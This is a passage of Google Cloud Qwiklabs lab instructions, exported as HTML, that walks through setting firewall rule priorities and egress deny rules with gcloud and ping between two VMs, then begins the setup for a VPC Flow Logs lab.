class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping &lt;external_ip_of_mynet-vm-2&gt;</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/external_ip_of_mynet-vm-2&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>This should </span><strong><span>NOT</span></strong><span> work. When you ping the external IP address, the connection goes through the internet gateway, which causes the request to be NATed. The request is now coming from the </span><em><span>external</span></em><span> IP address of the mynet-vm-1 instance. The firewall rule is to only allow ICMP requests that come from </span><em><span>internal</span></em><span> IP addresses.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create custom ingress firewall rules</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-5-set-the-firewall-rule-priority-2'><span>Task 5. Set the firewall rule priority</span></h4><p><span>In this task, you set the firewall rule priority to deny ICMP traffic. You then verify that any traffic that does not match the rule priority is denied.</span></p><p><span>So far, all the rules created have been ingress allow rules, so the priority has not been important. Firewall rules can be both allow and deny, can specify ingress and egress, and have a priority from 0 to 65,535. If you do not set a priority, the default is 1,000. Rules are evaluated based on priority, starting from the lowest value. The first rule that matches gets applied.</span></p><ol start='' ><li><p><span>In the first Cloud Shell session, verify that you are still connected to the </span><strong><span>mynet-vm-1</span></strong><span> instance. You can tell because the prompt will be: </span><code>qwiklabs@mynet-vm-1:~$</code><span>.</span></p></li></ol><p><span>If not connected, use the following command to reconnect:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud compute ssh qwiklabs@mynet-vm-1 --zone us-east4-a</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Verify that you can still ping the </span><strong><span>mynet-vm-2</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li><li><p><span>Switch to your second Cloud Shell window (or open a new one).</span></p></li><li><p><span>In the second Cloud Shell, create a firewall ingress rule to deny ICMP traffic from any IP with a priority of 500:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-ingress-deny-icmp-all --network \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork --action DENY --direction INGRESS --rules icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority 500</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Switch back to the first Cloud Shell connected to the </span><strong><span>mynet-vm-1</span></strong><span> instance, and try to ping the </span><strong><span>mynet-vm-2</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>It should no longer work. This new rule has a priority of 500, where the allow rule is 1,000.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li></ol><p><span>Now change the deny rule to a priority of 2,000.</span></p><ol start='' ><li><p><span>In the second Cloud Shell, modify the firewall rule just created and change the priority to </span><code>2000</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules update \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-ingress-deny-icmp-all \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority 2000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Switch back to the first Cloud Shell connected to the </span><strong><span>mynet-vm-1</span></strong><span> instance, and try to ping the </span><strong><span>mynet-vm-2</span></strong><span> instance again:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This time it will work because the deny rule has a lower priority, so the allow rule is the first matching rule.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li></ol><h4 id='task-6-configure-egress-firewall-rules-2'><span>Task 6. Configure egress firewall rules</span></h4><p><span>In this task, you create an egress firewall rule and set the priority to 10,000. You then verify that both ingress and egress rule allow that traffic.</span></p><ol start='' ><li><p><span>From the second Cloud Shell window, list all the current firewall rules:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules list \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--filter="network:mynetwork"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>Currently, the VMs are still able to ping each other because the rule that denies ICMP has a higher priority than the allow ICMP rule.</span></p><p><span>Now try an egress rule.</span></p><ol start='' ><li><p><span>Create a firewall egress rule to block ICMP traffic from any IP with a priority of </span><code>10000</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork-egress-deny-icmp-all --network \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mynetwork --action DENY --direction EGRESS --rules icmp \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--priority 10000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>List all the current firewall rules again:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules list \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--filter="network:mynetwork"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><span>Notice that the egress rule priority is set to 10,000, which is much higher than the rules created earlier.</span></p><ol start='' ><li><p><span>Switch back to the first Cloud Shell connected to the </span><strong><span>mynet-vm-1</span></strong><span> instance and try to ping the </span><strong><span>mynet-vm-2</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> ping mynet-vm-2.us-central1-f.c.[PROJECT_ID].internal</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>It should no longer work</span></strong><span>. Even though the egress rule has a much higher priority of 10,000, it is still blocking traffic. This is because for traffic to be allowed, there must be both an ingress and egress rule allowing that traffic. The priority of ingress rules does not affect the priority of egress rules.</span></p><ol start='' ><li><p><span>Press </span><strong><span>Ctrl+C</span></strong><span> to stop ping.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a firewall rule with priority and egress firewall rule.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='congratulations-9'><span>Congratulations!</span></h4><p><span>In this lab, you did the following:</span></p><ul><li><p><span>Created an auto-mode network, a custom-mode network, and associated subnetworks.</span></p></li><li><p><span>Investigated firewall rules in the default network, and then deleted the default network.</span></p></li><li><p><span>Used firewall rule features for more precise and flexible control of connections.</span></p></li></ul><h3 id='lab---configuring-and-using-vpc-flow-logs-in-cloud-logging'><span>LAB - Configuring and Using VPC Flow Logs in Cloud Logging</span></h3><h4 id='overview-11'><span>Overview</span></h4><p><span>In this lab, you will investigate </span><a href='https://cloud.google.com/vpc/docs/flow-logs'><span>VPC flow logs</span></a><span>. VPC flow logs record network flows sent from or received by VM instances. These logs can be used for network monitoring, forensics, real-time security analysis, and even for expense optimization.</span></p><p><span>During this lab you enable VPC flow logging and use Cloud Logging to view the logs. Next, you perform network monitoring, forensics, and real-time security analysis, before finally, disabling VPC flow logging.</span></p><h5 id='objectives-8'><span>Objectives</span></h5><p><span>In this lab, you learn how to:</span></p><ul><li><p><span>Enable VPC flow logging for a subnet.</span></p></li><li><p><span>Access logs via Cloud Logging.</span></p></li><li><p><span>Filter logs for specific subnets, VMs, ports, or protocols.</span></p></li><li><p><span>Perform network monitoring, forensics, and real-time security analysis.</span></p></li><li><p><span>Disable VPC flow logging.</span></p></li></ul><h4 id='setup-and-requirements-9'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h5 id='activate-google-cloud-shell-5'><span>Activate Google Cloud Shell</span></h5><p><span>Google Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud.</span></p><p><span>Google Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>In Cloud console, on the top right toolbar, click the Open Cloud Shell button.</span></p><p><img src="https://cdn.qwiklabs.com/WGBFVIap4CrFWut%2BGdNFzNxeelWYHF1IqYSMFH6Ouq4%3D" referrerpolicy="no-referrer" alt="Highlighted Cloud Shell icon"></p></li><li><p><span>Click </span><strong><span>Continue</span></strong><span>.</span></p></li></ol><p><span>It takes a few moments to provision and connect to the environment. When you are connected, you are already authenticated, and the project is set to your </span><em><span>PROJECT_ID</span></em><span>. For example:</span></p><p><img src="https://cdn.qwiklabs.com/hmMK0W41Txk%2B20bQyuDP9g60vCdBajIS%2B52iI2f4bYk%3D" referrerpolicy="no-referrer" alt="Project ID highlighted in the Cloud Shell Terminal"></p><p><strong><span>gcloud</span></strong><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ul><li><p><span>You can list the active account name with this command:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Credentialed accounts:</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> - &lt;myaccount&gt;@&lt;mydomain&gt;.com (active)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/mydomain&gt;&lt;/myaccount&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 